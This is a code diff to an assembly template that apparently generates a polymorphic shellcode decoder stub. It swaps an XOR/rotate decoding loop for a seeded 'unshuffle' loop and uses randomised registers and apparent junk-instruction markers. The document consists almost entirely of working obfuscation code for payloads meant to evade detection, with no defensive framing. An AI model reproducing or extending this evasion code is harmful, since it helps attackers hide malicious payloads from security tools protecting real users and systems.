@@ -37,29 +37,58 @@ entry:
   test {{.Reg.edx}}, {{.Reg.edx}}              {{iji}}
   jz skip_unshuffle                            {{iji}}
 
+  // calculate the body address
   call calc_body_addr
  flag_CEA:                                              {{iji}}
-  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{iji}}
-  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{iji}}
-  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{iji}}
+  add {{.Reg.ebp}}, body - flag_CEA + {{hex .OffsetT}}  {{iji}}
+  add {{.Reg.ebp}}, {{hex .OffsetA}}                    {{iji}}
+  sub {{.Reg.ebp}}, {{hex .OffsetS}}                    {{iji}}
 
-  // decode shellcode body
- loop_xor:
-  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{ijs}}
-  ror {{.Reg.edi}}, 5                          {{ijs}}
-  xor {{.Reg.edi}}, {{.Reg.eax}}               {{ijs}}
-  rol {{.Reg.edi}}, 17                         {{ijs}}
-  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{ijs}}
-  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{ijs}}
+  // unshuffle shellcode body
+ loop_unshuffle:
+  // seed = seed * multiplier + increment
+  imul {{.Reg.eax}}, {{.Reg.ebx}}              {{iji}}
+  add {{.Reg.eax}}, {{.Reg.ecx}}               {{iji}}
 
-  // call xor shift 32
-  jmp xor_shift_32                             {{ijs}}
- ret_1:
+  // save seed and calculate seed >> 3
+  push {{.Reg.eax}}                            {{iji}}
+  shr {{.Reg.eax}}, 3                          {{iji}}
 
-  // update address and counter
-  add {{.Reg.esi}}, 4                          {{ijs}}
-  dec {{.Reg.ecx}}                             {{ijs}}
-  jnz loop_xor                                 {{ijs}}
+  // reserve space for store the div result
+  sub esp, 4                                   {{iji}}
+
+  // save context about execute div
+  push eax                                     {{iji}}
+  push ecx                                     {{iji}}
+  push edx                                     {{iji}}
+
+  // calculate seed % (i + 1)
+  // push/pop for prevent register conflict
+  push {{.Reg.edx}}                            {{iji}}
+  push {{.Reg.eax}}                            {{iji}}
+  pop eax                                      {{iji}}
+  pop ecx                                      {{iji}}
+  inc ecx                                      {{iji}}
+  xor edx, edx                                 {{iji}}
+  div ecx                                      {{iji}}
+
+  // store the div result
+  mov [esp+3*4], edx                           {{iji}}
+
+  // restore context about execute div
+  pop edx                                      {{iji}}
+  pop ecx                                      {{iji}}
+  pop eax                                      {{iji}}
+
+  // restore stack
+  add esp, 4                                   {{iji}}
+
+  // restore seed
+  pop {{.Reg.eax}}                             {{iji}}
+
+  // update loop counter
+  dec {{.Reg.edx}}                             {{iji}}
+  jnz loop_unshuffle                           {{iji}}
  skip_unshuffle:
 
   // restore context
